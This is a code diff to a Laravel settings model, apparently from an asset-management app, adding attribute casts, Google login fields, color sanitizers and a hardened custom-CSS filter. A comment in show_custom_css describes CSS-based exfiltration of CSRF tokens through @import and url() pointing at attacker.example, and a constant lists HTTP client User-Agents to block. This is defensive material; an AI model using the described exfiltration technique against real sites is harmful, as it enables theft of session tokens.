@@ -2,15 +2,18 @@
 
 namespace App\Models;
 
+use App\Helpers\Helper;
+use App\Rules\CssColor;
+use Carbon\Carbon;
+use Illuminate\Database\Eloquent\Casts\Attribute;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
 use Illuminate\Database\Eloquent\Model;
 use Illuminate\Notifications\Notifiable;
 use Illuminate\Support\Collection;
 use Illuminate\Support\Facades\App;
 use Illuminate\Support\Facades\Cache;
-use App\Helpers\Helper;
+use Illuminate\Support\Facades\Log;
 use Watson\Validating\ValidatingTrait;
-
 
 /**
  * Settings model.
@@ -22,7 +25,6 @@ class Setting extends Model
 
     /**
      * The cache property so that multiple invocations of this will only load the Settings record from disk only once
-     * @var self
      */
     public static ?self $_cache = null;
 
@@ -48,34 +50,9 @@ class Setting extends Model
      * @var array
      */
     protected $rules = [
-          'brand'                               => 'required|min:1|numeric',
-          'qr_text'                             => 'max:31|nullable',
-          'alert_email'                         => 'email_array|nullable',
-          'admin_cc_email'                      => 'email|nullable',
-          'default_currency'                    => 'required',
-          'locale'                              => 'required',
-          'labels_per_page'                     => 'numeric',
-          'labels_width'                        => 'numeric',
-          'labels_height'                       => 'numeric',
-          'labels_pmargin_left'                 => 'numeric|nullable',
-          'labels_pmargin_right'                => 'numeric|nullable',
-          'labels_pmargin_top'                  => 'numeric|nullable',
-          'labels_pmargin_bottom'               => 'numeric|nullable',
-          'labels_display_bgutter'              => 'numeric|nullable',
-          'labels_display_sgutter'              => 'numeric|nullable',
-          'labels_fontsize'                     => 'numeric|min:5',
-          'labels_pagewidth'                    => 'numeric|nullable',
-          'labels_pageheight'                   => 'numeric|nullable',
-          'login_remote_user_enabled'           => 'numeric|nullable',
-          'login_common_disabled'               => 'numeric|nullable',
-          'login_remote_user_custom_logout_url' => 'string|nullable',
-          'login_remote_user_header_name'       => 'string|nullable',
-          'thumbnail_max_h'                     => 'numeric|max:500|min:25',
-          'pwd_secure_min'                      => 'numeric|required|min:8',
-          'audit_warning_days'                  => 'numeric|nullable',
-          'audit_interval'                      => 'numeric|nullable',
-          'custom_forgot_pass_url'              => 'url|nullable',
-          'privacy_policy_link'                 => 'nullable|url',
+        'brand' => 'required|min:1|numeric',
+        'thumbnail_max_h' => 'numeric|max:500|min:25',
+        'google_client_id' => 'nullable|ends_with:apps.googleusercontent.com',
     ];
 
     protected $fillable = [
@@ -86,6 +63,54 @@ class Setting extends Model
         'webhook_endpoint',
         'webhook_channel',
         'webhook_botname',
+        'google_login',
+        'google_client_id',
+        'google_client_secret',
+        'manager_view_enabled',
+    ];
+
+    protected $casts = [
+        'label2_asset_logo' => 'boolean',
+        'require_checkinout_notes' => 'boolean',
+        'manager_view_enabled' => 'boolean',
+        'block_api_user_agents' => 'boolean',
+        'block_blank_api_user_agents' => 'boolean',
+        // tinyInteger with no cast was leaking 0 (int) into call sites that
+        // use loose-equality string checks like `== '1'` and `== ''`. Under
+        // PHP 8 `0 == ''` is false, so checks expecting "disabled" misfired.
+        // Normalize on read so every consumer sees a consistent string mode.
+        'two_factor_enabled' => 'string',
+    ];
+
+    /**
+     * Suggested defaults for the "blocked API User-Agent patterns" textarea.
+     *
+     * Substrings (matched case-insensitively against the request's User-Agent)
+     * that identify common scripted or default HTTP clients. New installs see
+     * this list as the pre-filled textarea value; admins can add, remove, or
+     * blank it out entirely. Browser-driven AJAX (snipeit.js, datatables,
+     * select2, etc.) carries the browser's own User-Agent and is unaffected.
+     */
+    public const DEFAULT_BLOCKED_API_USER_AGENTS = [
+        'curl/',
+        'wget/',
+        'python-requests/',
+        'python-urllib',
+        'PostmanRuntime/',
+        'insomnia/',
+        'Go-http-client/',
+        'okhttp/',
+        'HTTPie/',
+        'Apache-HttpClient/',
+        'Java/',
+        'Faraday',
+        'http.rb/',
+        'libwww-perl/',
+        'Ruby',
+        'node-fetch/',
+        'axios/',
+        'GuzzleHttp/',
+        'RestSharp/',
     ];
 
     /**
@@ -95,12 +120,10 @@ class Setting extends Model
      * @author Wes Hulette <jwhulette@gmail.com>
      *
      * @since 5.0.0
-     *
-     * @return \App\Models\Setting|null
      */
     public static function getSettings(): ?self
     {
-        if (!self::$_cache) {
+        if (! self::$_cache) {
             // Need for setup as no tables exist
             try {
                 self::$_cache = self::first();
@@ -108,14 +131,13 @@ class Setting extends Model
                 return null;
             }
         }
+
         return self::$_cache;
     }
 
     /**
      * Check to see if setup process is complete.
      *  Cache is expired on Setting model saved in EventServiceProvider.
-     *
-     * @return bool
      */
     public static function setupCompleted(): bool
     {
@@ -125,7 +147,8 @@ class Setting extends Model
 
             return $usercount > 0 && $settingsCount > 0;
         } catch (\Throwable $th) {
-            \Log::debug('User table and settings table DO NOT exist or DO NOT have records');
+            Log::debug('User table and settings table DO NOT exist or DO NOT have records');
+
             // Catch the error if the tables dont exit
             return false;
         }
@@ -133,19 +156,16 @@ class Setting extends Model
 
     /**
      * Get the current Laravel version.
-     *
-     * @return string
      */
     public function lar_ver(): string
     {
         $app = App::getFacadeApplication();
+
         return $app::VERSION;
     }
 
     /**
      * Get the default EULA text.
-     *
-     * @return string|null
      */
     public static function getDefaultEula(): ?string
     {
@@ -159,9 +179,7 @@ class Setting extends Model
     /**
      * Check wether to show in model dropdowns.
      *
-     * @param string $element
-     *
-     * @return bool
+     * @param  string  $element
      */
     public function modellistCheckedValue($element): bool
     {
@@ -191,28 +209,101 @@ class Setting extends Model
      *
      * Important: Do not remove the e() escaping here, as we output raw in the blade.
      *
-     * @return string escaped CSS
-     *
      * @author A. Gianotto <snipe@snipe.net>
+     *
+     * @return Attribute<string, mixed>
      */
+    protected function headerColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#3c8dbc'),
+        );
+    }
+
+    /**
+     * @return Attribute<string, mixed>
+     */
+    protected function linkLightColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#296282'),
+        );
+    }
+
+    /**
+     * @return Attribute<string, mixed>
+     */
+    protected function linkDarkColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#5fa4cc'),
+        );
+    }
+
+    /**
+     * @return Attribute<string, mixed>
+     */
+    protected function navLinkColor(): Attribute
+    {
+        return Attribute::make(
+            get: fn (?string $value) => CssColor::sanitize($value, '#ffffff'),
+        );
+    }
+
     public function show_custom_css(): string
     {
         $custom_css = self::getSettings()->custom_css;
-        $custom_css = e($custom_css);
-        // Needed for modifying the bootstrap nav :(
-        $custom_css = str_ireplace('script', 'SCRIPTS-NOT-ALLOWED-HERE', $custom_css);
-        $custom_css = str_replace('&gt;', '>', $custom_css);
-        // Allow String output (needs quotes)
-        $custom_css = str_replace('&quot;', '"', $custom_css);
+        if ($custom_css === null || $custom_css === '') {
+            return '';
+        }
+
+        // Superuser-planted CSS renders inside <style> on every layout for
+        // every other superuser, so the sanitize step has to hold up as a
+        // CSS filter, not just an HTML filter. Two abuse primitives to
+        // shut down:
+        //
+        //   @import url("https://attacker.example/x.css") lets the planter
+        //   load an unrestricted external stylesheet, which can then use
+        //   attribute-selector rules (input[name="_token"][value^="a"]{...})
+        //   to exfiltrate CSRF tokens character by character on every page
+        //   load.
+        //
+        //   background: url("https://attacker.example/?t=...") reaches the
+        //   same primitive without @import as long as the value is any
+        //   absolute or protocol-relative URL. Same-origin relative paths
+        //   under /uploads/ etc. are fine for legit branding assets.
+        //
+        // strip_tags belt-and-braces guards against injection reaching a
+        // context that treats < as an HTML boundary. The old encode-then-
+        // selectively-decode chain silently undid its own work on > and "
+        // and did not touch either @import or url(), so it's gone.
+        $custom_css = strip_tags($custom_css);
+        $custom_css = preg_replace('/@import\s+[^;]*;?/i', '', $custom_css);
+        $custom_css = preg_replace_callback(
+            '/\burl\s*\(\s*([^)]*)\)/i',
+            function (array $match): string {
+                $value = trim($match[1], " \t\n\r\"'");
+                if ($value === '' || preg_match('#^(https?:)?//|^data:|^javascript:|^vbscript:#i', $value)) {
+                    return '';
+                }
+
+                return $match[0];
+            },
+            $custom_css,
+        );
 
         return $custom_css;
+    }
+
+    public function isQrEnabled(): bool
+    {
+        return $this->qr_code == '1' || $this->label2_2d_type !== 'none';
     }
 
     /**
      * Converts bytes into human readable file size.
      *
-     * @param string $bytes
-     *
+     * @param  string  $bytes
      * @return string human readable file size (2,87 Мб)
      *
      * @author Mogilev Arseny
@@ -222,27 +313,27 @@ class Setting extends Model
         $result = 0;
         $bytes = floatval($bytes);
         $arBytes = [
-                0 => [
-                    'UNIT'  => 'TB',
-                    'VALUE' => pow(1024, 4),
-                ],
-                1 => [
-                    'UNIT'  => 'GB',
-                    'VALUE' => pow(1024, 3),
-                ],
-                2 => [
-                    'UNIT'  => 'MB',
-                    'VALUE' => pow(1024, 2),
-                ],
-                3 => [
-                    'UNIT'  => 'KB',
-                    'VALUE' => 1024,
-                ],
-                4 => [
-                    'UNIT'  => 'B',
-                    'VALUE' => 1,
-                ],
-            ];
+            0 => [
+                'UNIT' => 'TB',
+                'VALUE' => pow(1024, 4),
+            ],
+            1 => [
+                'UNIT' => 'GB',
+                'VALUE' => pow(1024, 3),
+            ],
+            2 => [
+                'UNIT' => 'MB',
+                'VALUE' => pow(1024, 2),
+            ],
+            3 => [
+                'UNIT' => 'KB',
+                'VALUE' => 1024,
+            ],
+            4 => [
+                'UNIT' => 'B',
+                'VALUE' => 1,
+            ],
+        ];
 
         foreach ($arBytes as $arItem) {
             if ($bytes >= $arItem['VALUE']) {
@@ -258,10 +349,8 @@ class Setting extends Model
     /**
      * The url for slack notifications.
      *  Used by Notifiable trait.
-     *
-     * @return string
      */
-    public function routeNotificationForSlack(): string
+    public function routeNotificationForSlack(): ?string
     {
         // At this point the endpoint is the same for everything.
         //  In the future this may want to be adapted for individual notifications.
@@ -270,10 +359,8 @@ class Setting extends Model
 
     /**
      * Get the mail reply to address from configuration.
-     *
-     * @return string
      */
-    public function routeNotificationForMail(): string
+    public function routeNotificationForMail(): ?string
     {
         // At this point the endpoint is the same for everything.
         //  In the future this may want to be adapted for individual notifications.
@@ -282,8 +369,6 @@ class Setting extends Model
 
     /**
      * Get the password complexity rule.
-     *
-     * @return string
      */
     public static function passwordComplexityRulesSaving($action = 'update'): string
     {
@@ -313,38 +398,73 @@ class Setting extends Model
      * @author Wes Hulette <jwhulette@gmail.com>
      *
      * @since 5.0.0
-     *
-     * @return Collection
      */
     public static function getLdapSettings(): Collection
     {
-        $ldapSettings = self::select([
-            'ldap_enabled',
-            'ldap_server',
-            'ldap_uname',
-            'ldap_pword',
-            'ldap_basedn',
-            'ldap_filter',
-            'ldap_username_field',
-            'ldap_lname_field',
-            'ldap_fname_field',
-            'ldap_auth_filter_query',
-            'ldap_version',
-            'ldap_active_flag',
-            'ldap_emp_num',
-            'ldap_email',
-            'ldap_server_cert_ignore',
-            'ldap_port',
-            'ldap_tls',
-            'ldap_pw_sync',
-            'is_ad',
-            'ad_domain',
-            'ad_append_domain',
-            'ldap_client_tls_key',
-            'ldap_client_tls_cert'
-            ])->first()->getAttributes();
+        $ldapSettings = self::select(
+            [
+                'ldap_enabled',
+                'ldap_server',
+                'ldap_uname',
+                'ldap_pword',
+                'ldap_basedn',
+                'ldap_filter',
+                'ldap_username_field',
+                'ldap_lname_field',
+                'ldap_fname_field',
+                'ldap_auth_filter_query',
+                'ldap_version',
+                'ldap_active_flag',
+                'ldap_emp_num',
+                'ldap_email',
+                'ldap_server_cert_ignore',
+                'ldap_port',
+                'ldap_tls',
+                'ldap_pw_sync',
+                'is_ad',
+                'ad_domain',
+                'ad_append_domain',
+                'ldap_client_tls_key',
+                'ldap_client_tls_cert',
+                'ldap_default_group',
+                'ldap_dept',
+                'ldap_phone_field',
+                'ldap_jobtitle',
+                'ldap_manager',
+                'ldap_country',
+                'ldap_location',
+            ]
+        )->first()->getAttributes();
 
         return collect($ldapSettings);
+    }
+
+    /**
+     * For a particular cache-file, refresh it if the settings have
+     * been updated more recently than the file. Then return the
+     * full filepath
+     */
+    public static function get_fresh_file_path($attribute, $path)
+    {
+        $full_path = storage_path().'/'.$path;
+        $file_exists = file_exists($full_path);
+        if ($file_exists) {
+            $statblock = stat($full_path);
+        }
+        if (! $file_exists || Carbon::createFromTimestamp($statblock['mtime']) < Setting::getSettings()->updated_at) {
+            if (Setting::getSettings()->{$attribute}) {
+                file_put_contents($full_path, Setting::getSettings()->{$attribute});
+            } else {
+                // this doesn't fire when you might expect it to because a lot of the time we do something like:
+                // if ($settings->ldap_client_tls_cert && ...
+                // so we never get a chance to 'uncache' the file.
+                if ($file_exists) {
+                    unlink($full_path);
+                }
+            }
+        }
+
+        return $full_path;
     }
 
     /**
@@ -354,7 +474,7 @@ class Setting extends Model
      */
     public static function get_client_side_cert_path()
     {
-        return storage_path().'/ldap_client_tls.cert';
+        return self::get_fresh_file_path('ldap_client_tls_cert', 'ldap_client_tls.cert');
     }
 
     /**
@@ -364,36 +484,6 @@ class Setting extends Model
      */
     public static function get_client_side_key_path()
     {
-        return storage_path().'/ldap_client_tls.key';
+        return self::get_fresh_file_path('ldap_client_tls_key', 'ldap_client_tls.key');
     }
-
-    public function update_client_side_cert_files()
-    {
-        /**
-         * I'm not sure if it makes sense to have a cert but no key
-         * nor vice versa, but for now I'm just leaving it like this.
-         *
-         * Also, we could easily set this up with an event handler and
-         * self::saved() or something like that but there's literally only
-         * one place where we will do that, so I'll just explicitly call
-         * this method at that spot instead. It'll be easier to debug and understand.
-         */
-        if ($this->ldap_client_tls_cert) {
-            file_put_contents(self::get_client_side_cert_path(), $this->ldap_client_tls_cert);
-        } else {
-            if (file_exists(self::get_client_side_cert_path())) {
-                unlink(self::get_client_side_cert_path());
-            }
-        }
-
-        if ($this->ldap_client_tls_key) {
-            file_put_contents(self::get_client_side_key_path(), $this->ldap_client_tls_key);
-        } else {
-            if (file_exists(self::get_client_side_key_path())) {
-                unlink(self::get_client_side_key_path());
-            }
-        }
-    }
-
-
 }
